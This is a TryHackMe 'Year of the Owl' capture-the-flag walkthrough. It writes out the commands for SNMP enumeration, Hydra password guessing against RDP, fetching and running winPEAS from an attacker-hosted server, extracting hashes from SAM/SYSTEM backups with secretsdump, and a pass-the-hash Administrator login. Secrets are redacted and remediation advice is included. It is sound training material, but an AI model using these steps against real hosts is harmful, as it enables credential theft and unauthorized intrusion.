# TryHackMe — Year of the Owl

> **Room:** Year of the Owl  
> **Platform:** TryHackMe  
> **Category:** Windows / Network Enumeration / Privilege Escalation  
> **Difficulty:** Record the room's current displayed difficulty here  
> **Status:** Completed in the lab; public write-up sanitized  
> **Author:** `<Arjun-2004-viswam>`

A practical walkthrough documenting the enumeration, initial access, Windows privilege-escalation investigation, and administrative access path observed in the **Year of the Owl** TryHackMe room.

> **Spoiler notice:** This write-up contains the attack path and technical solution. TryHackMe flags, passwords, and extracted password hashes are intentionally omitted. Use this material only for the designated room or systems for which you have explicit authorization.

---

## Table of contents

1. [Overview](#1-overview)
2. [Lab setup](#2-lab-setup)
3. [Reconnaissance and port scanning](#3-reconnaissance-and-port-scanning)
4. [SNMP enumeration](#4-snmp-enumeration)
5. [Identifying Windows users](#5-identifying-windows-users)
6. [Initial access through RDP credential testing](#6-initial-access-through-rdp-credential-testing)
7. [Connecting with Evil-WinRM](#7-connecting-with-evil-winrm)
8. [User-level discovery](#8-user-level-discovery)
9. [Windows privilege-escalation enumeration with winPEAS](#9-windows-privilege-escalation-enumeration-with-winpeas)
10. [Investigating the Recycle Bin](#10-investigating-the-recycle-bin)
11. [Understanding SAM and SYSTEM hives](#11-understanding-sam-and-system-hives)
12. [Offline registry-hive analysis](#12-offline-registry-hive-analysis)
13. [Administrator access validation](#13-administrator-access-validation)
14. [Findings and remediation](#14-findings-and-remediation)
15. [Troubleshooting notes](#15-troubleshooting-notes)
16. [Lessons learned](#16-lessons-learned)
17. [References](#17-references)

---

## 1. Overview

The objective of this room is to assess a Windows host by following a methodical penetration-testing workflow:

- Discover exposed TCP and UDP services.
- Enumerate SNMP to obtain system and account information.
- Identify a valid lab account and assess RDP authentication.
- Establish a remote Windows session.
- Enumerate the host for privilege-escalation opportunities.
- Investigate a user's Recycle Bin for sensitive backup files.
- Understand how exposed SAM and SYSTEM registry-hive backups can disclose local account credential material.
- Validate administrative access in the authorized lab.

The important lesson is that privilege escalation does not always depend on a software exploit. Poor handling of sensitive backup files can expose credential material and create a path to higher privileges.

## 2. Lab setup

### Attacker machine

- Kali Linux
- Nmap
- Net-SNMP utilities (`snmpwalk`, `snmptranslate`)
- onesixtyone
- Hydra
- Evil-WinRM
- PEASS-ng / winPEAS
- Impacket

### Target

The target is the Windows machine provisioned by the TryHackMe room. Its address can change whenever the room is restarted, so use the address shown in your own active room session.

Set a shell variable to avoid repeatedly typing the address:

```bash
export TARGET=<ROOM_TARGET_IP>
```

Do not copy a target IP, VPN address, password, hash, or flag from someone else's session. Use the values assigned to your own room instance.

## 3. Reconnaissance and port scanning

The first step is to identify reachable TCP services and their versions.

```bash
nmap -v -sV -sC "$TARGET" -oN nmap-tcp.txt
```

### Command explanation

| Option | Purpose |
|---|---|
| `-v` | Verbose output |
| `-sV` | Attempts service/version detection |
| `-sC` | Runs Nmap's default safe script set |
| `-oN` | Saves results in normal text format |

### Services observed in the supplied lab scan

| Port | Service | Observation |
|---:|---|---|
| 80/tcp | HTTP | Apache HTTP Server with PHP |
| 139/tcp | NetBIOS session service | Windows networking |
| 443/tcp | HTTPS | Apache over TLS |
| 445/tcp | SMB | Microsoft file-sharing service |
| 3306/tcp | MySQL/MariaDB | Database service; scan reported MariaDB |
| 3389/tcp | RDP | Microsoft Remote Desktop |
| 5985/tcp | WinRM over HTTP | Microsoft HTTP API / remote management |

The HTTP service title identified the site as **Year of the Owl**. RDP and WinRM were particularly relevant because they could support authenticated Windows access after credentials were obtained.

### Notes on scan interpretation

- An open port indicates that a service accepted a connection or responded to the probe.
- A service/version string is a fingerprint, not a guarantee of an exact patch level.
- `-sC` runs default scripts; it does not perform a complete vulnerability assessment.
- The SMB script output indicated that message signing was enabled but not required. This is a configuration observation, not proof that SMB is exploitable.

### Screenshot

Save a sanitized screenshot of your own scan as:

`evidence/01-nmap-tcp-scan.png`

Remove VPN details or unrelated host information before committing.

## 4. SNMP enumeration

SNMP commonly uses:

- UDP/161 for manager requests and agent responses.
- UDP/162 for SNMP traps.

The next step is to check those UDP ports.

```bash
sudo nmap -sU -sV -sC -p 161,162 "$TARGET" -oN nmap-snmp.txt
```

The supplied scan reported both ports as `open|filtered`. This state is inconclusive: Nmap did not receive enough information to distinguish an open service from packet filtering. Further protocol-level testing was therefore appropriate.

### 4.1 Community-string testing with onesixtyone

`onesixtyone` tests candidate SNMP community strings against a host. A community string is a shared SNMP access value, not an individual Windows user's password.

First, locate the installed SecLists wordlist rather than assuming its path:

```bash
find /usr/share/seclists -iname '*snmp*' 2>/dev/null
```

If SecLists is not installed on Kali:

```bash
sudo apt update
sudo apt install seclists -y
```

Use the actual wordlist path returned by `find`:

```bash
onesixtyone -c <PATH_TO_SNMP_WORDLIST> "$TARGET"
```

In the supplied lab notes, the community string was identified as a weak/default-style value. It is deliberately represented below as a placeholder:

```text
<THE_DISCOVERED_COMMUNITY_STRING>
```

Do not publish the actual community string from a live room instance.

### 4.2 What the response revealed

The SNMP response exposed system information, including:

- Hardware/platform description.
- Windows build information.
- Confirmation that the SNMP agent responded.
- A community string accepted by the agent.

This demonstrated that an exposed SNMP service can disclose useful host information when its access configuration is weak.

## 5. Identifying Windows users

After obtaining authorized SNMP access, query the Windows LAN Manager user-table OID:

```bash
snmpwalk -v 2c -c '<COMMUNITY_STRING>' "$TARGET" 1.3.6.1.4.1.77.1.2.25
```

The OID `1.3.6.1.4.1.77.1.2.25` is associated with the LAN Manager user table. Its availability depends on the SNMP agent and its configuration.

An alternative enumeration utility used in the lab notes was:

```bash
snmp-check -c '<COMMUNITY_STRING>' "$TARGET"
```

The enumeration output identified several local Windows accounts, including the non-default lab account used in the later access stage.

### Why this matters

Account enumeration helps an assessor understand which identities exist on a host. It does not reveal their passwords, and the presence of an account does not establish that the account is remotely accessible.

### Screenshot

`evidence/02-snmp-enumeration-redacted.png`

Redact the community string and any room-specific details you do not want to disclose.

## 6. Initial access through RDP credential testing

The room's attack path used a password-auditing step against the exposed RDP service. Hydra supports RDP authentication testing.

For a controlled, authorized lab, the command structure is:

```bash
hydra -l <LAB_USERNAME> -P <AUTHORIZED_WORDLIST> rdp://"$TARGET" -vV -f
```

### Option explanation

| Option | Meaning |
|---|---|
| `-l` | Specifies one username |
| `-P` | Specifies a password candidate file |
| `rdp://` | Selects the RDP service module |
| `-vV` | Displays verbose attempt information |
| `-f` | Stops after the first reported valid login |

The lab notes recorded that a valid credential pair was found for the enumerated standard user. The actual password is intentionally not reproduced in this public write-up.

### Security observations

- Password reuse and weak passwords can undermine remote-access controls.
- Repeated login attempts may trigger account lockout or monitoring.
- RDP should not be exposed broadly; restrict it to trusted administrative networks and use strong authentication controls.

**Evidence:** Add a screenshot with the password fully redacted. Never commit a wordlist containing custom passwords or recovered credentials.

## 7. Connecting with Evil-WinRM

The target exposed WinRM on TCP/5985. Evil-WinRM can create a remote PowerShell session when valid credentials and suitable permissions are available.

```bash
evil-winrm -i "$TARGET" -u '<LAB_USERNAME>' -p '<LAB_PASSWORD>'
```

The password is a placeholder. Do not place a real password directly in a public README or screenshot.

### Basic host enumeration

Once connected, collect basic context:

```powershell
whoami
hostname
whoami /all
Get-Location
Get-ChildItem -Force
```

These commands identify the current security context, host name, assigned privileges, working directory, and visible files.

The lab session was established as the standard user account rather than the local Administrator account.

### Evil-WinRM transfer commands

Evil-WinRM supports `upload` and `download` from its interactive prompt. A transfer should be considered successful only after verifying the destination file and its size.

For example, from the Evil-WinRM prompt:

```text
download <REMOTE_FILE>
```

If the transfer fails, record the error and verify the remote path, local destination, tool version, and network conditions. Do not claim a file was downloaded until it exists locally.

## 8. User-level discovery

After obtaining the standard-user session, inspect the user's profile directories:

```powershell
Get-ChildItem C:\Users\<LAB_USERNAME> -Force
```

The supplied lab notes identified the user flag file on the user's Desktop:

```powershell
Get-ChildItem C:\Users\<LAB_USERNAME>\Desktop -Force
```

The room's flag value is intentionally omitted. Follow TryHackMe's current rules for submitting flags; do not include the flag text in a public repository unless the platform explicitly permits it.

This step confirms access to the user's profile, but it does not by itself demonstrate administrative privileges.

## 9. Windows privilege-escalation enumeration with winPEAS

### 9.1 What winPEAS does

winPEAS is part of the PEASS-ng project. It automates local Windows enumeration and highlights configuration areas that may be relevant to privilege escalation, such as:

- User privileges and group membership.
- Services and service permissions.
- Scheduled tasks.
- Registry permissions and configuration.
- Installed applications and patches.
- Potentially sensitive files and paths.
- System and network configuration.

Official project: https://github.com/peass-ng/PEASS-ng

winPEAS is an enumeration tool, not an exploit. A highlighted item must be manually validated before it can be called a vulnerability.

### 9.2 Obtain the Windows batch version

The room notes used the batch version of winPEAS. Download it from the official PEASS-ng repository and verify that the file is the intended release.

On Kali, from the directory containing `winPEAS.bat`:

```bash
pwd
ls -lh winPEAS.bat
```

### 9.3 Transfer it to the Windows lab

Start a temporary HTTP server in that same directory:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

From the Windows PowerShell session, use the Kali interface address that is reachable from the target:

```powershell
Invoke-WebRequest -Uri "http://<KALI_REACHABLE_IP>:8000/winPEAS.bat" -OutFile "$env:USERPROFILE\Documents\winPEAS.bat"
```

If the request returns `404 Not Found`, the HTTP server was reached but the requested file was not present at that URL path. Check the Kali server's current directory and exact filename.

### 9.4 Run winPEAS on Windows

A `.bat` file is a Windows batch script. It must be executed on Windows, not directly by Kali's Bash shell.

From the Windows PowerShell session:

```powershell
Set-Location "$env:USERPROFILE\Documents"
.\winPEAS.bat
```

Running `./winPEAS.bat` in Kali Bash produces errors such as `SETLOCAL: not found` because Bash does not understand Windows batch commands.

### 9.5 Important finding

The enumeration output identified the standard user's SID. A SID is a Windows Security Identifier: a unique identifier for a user, group, or other security principal.

The relevant observation was that the user's Recycle Bin could be inspected under a SID-named directory. This led to the next investigation.

## 10. Investigating the Recycle Bin

Windows stores per-user Recycle Bin content under:

```text
C:\$Recycle.Bin\<USER_SID>\
```

The SID found during enumeration was associated with the standard lab user. Use the SID reported by your own session rather than copying one from another run.

In PowerShell:

```powershell
Get-ChildItem -Force 'C:\$Recycle.Bin'
Get-ChildItem -Force 'C:\$Recycle.Bin\<USER_SID>'
```

The lab directory listing revealed two backup-looking files:

| File | Observed size in the supplied lab notes |
|---|---:|
| `sam.bak` | 49,152 bytes |
| `system.bak` | 17,457,152 bytes |

These names and sizes suggest registry-hive backups, but filenames alone do not prove file contents. The important security issue is that sensitive system backup material was present in a location accessible during the lab's user context.

### 10.1 Copying files within the Windows session

In PowerShell, use `Copy-Item` (or its `Copy` alias) with quoted paths:

```powershell
Copy-Item -LiteralPath 'C:\$Recycle.Bin\<USER_SID>\sam.bak' -Destination "$env:USERPROFILE\Documents\sam.bak"
Copy-Item -LiteralPath 'C:\$Recycle.Bin\<USER_SID>\system.bak' -Destination "$env:USERPROFILE\Documents\system.bak"
```

Verify the copies:

```powershell
Get-Item "$env:USERPROFILE\Documents\sam.bak"
Get-Item "$env:USERPROFILE\Documents\system.bak"
```

Only handle these files inside the authorized training environment. They contain sensitive credential-related data and must not be uploaded to GitHub.

## 11. Understanding SAM and SYSTEM hives

The two files are significant because Windows uses registry hives to store account and system configuration data.

### SAM — Security Account Manager

The SAM registry hive stores local account database information, including password-hash material.

### SYSTEM registry hive

The SYSTEM hive contains system configuration and boot-key material involved in protecting the SAM database.

When valid SAM and SYSTEM hive copies are available together, an authorized offline assessment can recover local account hash material. This is why the files must be treated as highly sensitive.

**Defensive lesson:** Registry-hive backups should never be left in user-accessible folders or the Recycle Bin. They require access controls and secure backup handling.

## 12. Offline registry-hive analysis

The lab notes used Impacket's `secretsdump` utility to analyse the two hive backups from Kali. This is an offline analysis step; the utility is run on the analyst's machine, not inside Windows PowerShell.

Check that Impacket is available:

```bash
impacket-secretsdump -h
```

After the authorized lab files have been transferred to a protected local working directory, the command format is:

```bash
impacket-secretsdump -sam <PATH_TO_SAM_HIVE_COPY> -system <PATH_TO_SYSTEM_HIVE_COPY> LOCAL
```

### Understanding the output format

A local SAM hash record is commonly represented in this general structure:

```text
username:RID:LM_hash:NT_hash:::
```

- `username`: local account name.
- `RID`: Relative Identifier for the account.
- `LM_hash`: legacy LAN Manager hash field; often a known empty placeholder on modern Windows systems.
- `NT_hash`: NT password-hash material.

The supplied lab output showed that the offline analysis recovered local account hash records, including one for the built-in Administrator account. The actual hash values are deliberately removed from this public walkthrough.

### Important handling rule

Do not commit:
- SAM or SYSTEM hive files.
- Extracted password hashes.
- Password-cracking output.
- Passwords or reusable authentication material.

The public repository should describe the method and the security impact, not distribute credential material.

## 13. Administrator access validation

The lab notes then used the recovered Administrator hash for an authorized pass-the-hash authentication test with Evil-WinRM.

The general command format is:

```bash
evil-winrm -i "$TARGET" -u 'Administrator' -H '<ADMINISTRATOR_NT_HASH>'
```

The hash is intentionally omitted. This example is for the isolated TryHackMe room only.

A successful connection should be validated by checking the current account and its privileges:

```powershell
whoami
whoami /all
hostname
```

The supplied lab notes recorded a successful Administrator session. The Administrator profile's Desktop contained the room's administrative flag file. The flag value is not reproduced here.

This completed the privilege-escalation path documented by the supplied lab notes.

## 14. Findings and remediation

| Finding | Security impact | Recommended remediation |
|---|---|---|
| SNMP exposed with a weak community configuration | System and account information disclosure | Disable SNMP if unnecessary; otherwise use SNMPv3 with authentication and privacy, restrict source addresses, and rotate secrets |
| Local account information disclosed through SNMP | Helps an attacker identify account names | Restrict SNMP views and access; avoid exposing user tables |
| RDP reachable | Expands remote authentication attack surface | Restrict RDP to trusted networks, enforce strong unique passwords and MFA where supported, and monitor failed logins |
| WinRM reachable | Provides a remote management surface | Restrict WinRM to administrative hosts, use secure transport and strong authentication, and audit access |
| Sensitive SAM/SYSTEM backups present in a user-accessible Recycle Bin path | Potential disclosure of local password-hash material | Remove exposed backups securely, protect hive backups with strict ACLs and encryption, and review backup retention |
| Administrative hash could be used for remote authentication in the lab | Compromise of the local Administrator account | Rotate affected credentials, use unique credentials, restrict NTLM where feasible, and monitor pass-the-hash indicators |

### Risk summary

The most consequential issue in this path was the exposure of sensitive registry-hive backups. Network enumeration and weak authentication helped identify and access the host, but the backup files created the route to local account hash recovery and administrative authentication.

## 15. Troubleshooting notes

These are useful issues encountered while reproducing the workflow.

### SecLists path does not exist

Error:

```text
Error opening community file
```

Check whether SecLists is installed and locate the actual SNMP wordlist:

```bash
dpkg -l | grep -i seclists
find /usr/share/seclists -iname '*snmp*' 2>/dev/null
```

Do not assume the wordlist is always named `snmp-onesixtyone.txt` or installed in one fixed directory.

### Running winPEAS batch on Kali

Errors such as:

```text
SETLOCAL: not found
TITLE: not found
Syntax error: "(" unexpected
```

Cause: the Windows `.bat` file was passed to Bash. Run it in Windows CMD or PowerShell instead.

### Python HTTP server returns 404

A 404 means the web server was reachable but the requested file was not found at the requested path. On Kali, check:

```bash
pwd
ls -lh
```

Start the server from the directory that contains the file, and make sure the requested filename matches exactly.

### Evil-WinRM download failure

If Evil-WinRM reports a transfer error:

1. Confirm the remote file exists with `Get-Item`.
2. Confirm the exact remote path and filename.
3. Check the Evil-WinRM version and its help output.
4. Verify the local working directory and whether a partial file was created.
5. Record the transfer as failed until the local file's existence and size are verified.

A command being accepted by the Evil-WinRM prompt does not prove that the file transfer completed.

### PowerShell versus Kali commands

| Command/tool | Where to run it |
|---|---|
| `snmpwalk`, `onesixtyone`, `nmap`, `hydra` | Kali |
| `evil-winrm` | Kali |
| `download` / `upload` | Evil-WinRM interactive prompt |
| `Get-ChildItem`, `Copy-Item`, `whoami` | Windows PowerShell session |
| `impacket-secretsdump` | Kali / analyst machine |
| `winPEAS.bat` | Windows |

## 16. Lessons learned

1. Start with systematic service discovery before choosing an attack path.
2. SNMP can reveal useful host and account information when access is poorly configured.
3. OIDs identify specific managed objects; understanding the OID tree makes SNMP enumeration more targeted.
4. Remote access services should be assessed with authorization and lockout policies in mind.
5. winPEAS is useful for identifying leads, but findings require manual validation.
6. A SID can help locate a user's Recycle Bin directory.
7. SAM and SYSTEM backups are highly sensitive because together they can expose local account hash material.
8. File-transfer success must be verified at the destination.
9. Never publish passwords, hashes, raw registry hives, or challenge flags in a public repository.

## 17. References

- TryHackMe: https://tryhackme.com/
- PEASS-ng / winPEAS: https://github.com/peass-ng/PEASS-ng
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
- Impacket: https://github.com/fortra/impacket
- Net-SNMP documentation: https://www.net-snmp.org/docs/
- Nmap reference guide: https://nmap.org/book/man.html
- Microsoft Windows Remote Management: https://learn.microsoft.com/en-us/windows/win32/winrm/portal

---

## Author's note

This walkthrough is based on my own lab notes and recorded observations. I have rewritten the material in my own structure and removed passwords, hashes, and flag values. Where a result depends on a particular room instance, verify it against your own run before publishing screenshots or claiming independent reproduction.

If you find an error or have a defensive improvement, feel free to open an issue or submit a pull request.
